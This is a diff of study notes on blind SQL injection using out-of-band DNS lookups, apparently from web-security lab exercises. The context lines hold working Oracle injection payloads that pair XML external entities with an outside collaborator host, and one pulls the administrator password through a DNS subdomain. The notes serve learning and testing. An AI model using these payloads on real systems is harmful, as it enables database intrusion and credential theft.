@@ -23,7 +23,7 @@ This causes the database to perform a lookup for the following domain
 
 You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.
 
-> [!example] Lab Example
+> [!example] Lab Example (OracleSQL)
 > Lab Example DNS lookup exploiting XXE (Picture below, not code)
 > ```sql
 > '+UNION+SELECT+EXTRACTVALUE(xmltype('<(percent-sign)3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//aguwc4wrt8qnbkrjnl2haga6exko8fw4.oastify.com/">+%25remote%3b]>'),'/1')+FROM+dual--
@@ -46,7 +46,7 @@ S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
 Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.
 
 > [!example] Lab Example. Fetching administrator password using DNS lookup with data exfiltration:
-> Make sure to replace percent-sign with %
+> Make sure to **replace** percent-sign with %
 > 
 > ```sql
 > '+UNION+SELECT+EXTRACTVALUE(xmltype('<(percent-sign)3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.aguwc4wrt8qnbkrjnl2haga6exko8fw4.oastify.com/">+%25remote%3b]>'),'/1')+FROM+dual--
